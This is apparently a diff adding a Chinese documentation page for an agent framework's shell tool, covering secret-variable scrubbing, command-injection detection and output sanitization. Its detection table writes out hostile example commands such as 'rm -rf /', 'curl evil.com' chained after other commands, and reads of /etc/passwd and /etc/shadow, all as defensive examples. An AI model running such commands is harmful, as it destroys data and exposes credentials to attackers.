@@ -1,0 +1,92 @@
+---
+title: Shell 命令
+description: 带环境脱敏与注入检测的命令执行
+---
+
+`shell` 工具允许代理在主机执行命令。由于权限强，IronClaw 在执行前会做两层防护：环境变量脱敏与命令注入检测。
+
+---
+
+## 配置
+
+```bash
+export ALLOW_LOCAL_TOOLS=true
+```
+
+未开启时，`shell` 工具不会注册给模型。
+
+---
+
+## 环境变量脱敏
+
+执行前会构建“净化环境”，敏感变量完全移除，不会出现在子进程环境中。
+
+**会被移除的变量（示例）**
+
+- API Key / Token：`OPENAI_API_KEY`、`ANTHROPIC_API_KEY`、`NEARAI_API_KEY`
+- 数据库凭据：`DATABASE_URL`、`LIBSQL_AUTH_TOKEN`
+- 认证令牌：`GATEWAY_AUTH_TOKEN`、`HTTP_WEBHOOK_SECRET`
+- 模式匹配：`*_KEY`、`*_SECRET`、`*_TOKEN`、`*_PASSWORD`
+
+**会保留的变量（示例）**
+
+- `PATH`、`HOME`
+- `USER`、`SHELL`
+- `LANG`、`LC_*`
+
+这样可以防止 `env`、`printenv` 或恶意二进制泄露密钥。
+
+---
+
+## 注入检测
+
+执行前会分析命令并拦截常见注入模式。
+
+| 模式 | 例子 | 拦截原因 |
+|------|------|----------|
+| `;` 串联 | `ls; rm -rf /` | 无条件执行第二条命令 |
+| `&&` 串联 | `echo ok && curl evil.com` | 条件执行恶意命令 |
+| `||` 串联 | `false || curl evil.com` | 失败后执行恶意命令 |
+| `$()` 子命令 | `echo $(cat /etc/passwd)` | 命令替换 |
+| 反引号子命令 | `` echo `id` `` | 命令替换 |
+| 路径穿越 | `cat ../../../etc/shadow` | 逃逸预期目录 |
+| 空字节 | `command\x00injection` | 底层字符串截断风险 |
+
+<Note>
+单命令内部的管道 `|` 允许使用。
+</Note>
+
+---
+
+## 输出清洗
+
+shell 输出在返回 LLM 前会经过 Safety Layer：
+
+1. 泄漏检测并打码敏感内容
+2. 转义危险控制字符
+
+输出会封装为：
+
+```xml
+<tool_output name="shell" sanitized="true">
+  [command stdout/stderr]
+</tool_output>
+```
+
+---
+
+## 安全建议
+
+<AccordionGroup>
+  <Accordion title="不可信代码优先用 Docker 沙箱" icon="container">
+    运行未知脚本或第三方代码时优先使用容器沙箱，不建议直接使用主机 shell。
+  </Accordion>
+
+  <Accordion title="注入检测不是唯一防线" icon="shield">
+    注入检测是防御增强，不应替代正确的参数转义与输入校验。
+  </Accordion>
+
+  <Accordion title="超时控制" icon="clock">
+    超过 `timeout_secs` 的命令会被终止；长任务可调高超时或改为后台任务。
+  </Accordion>
+</AccordionGroup>
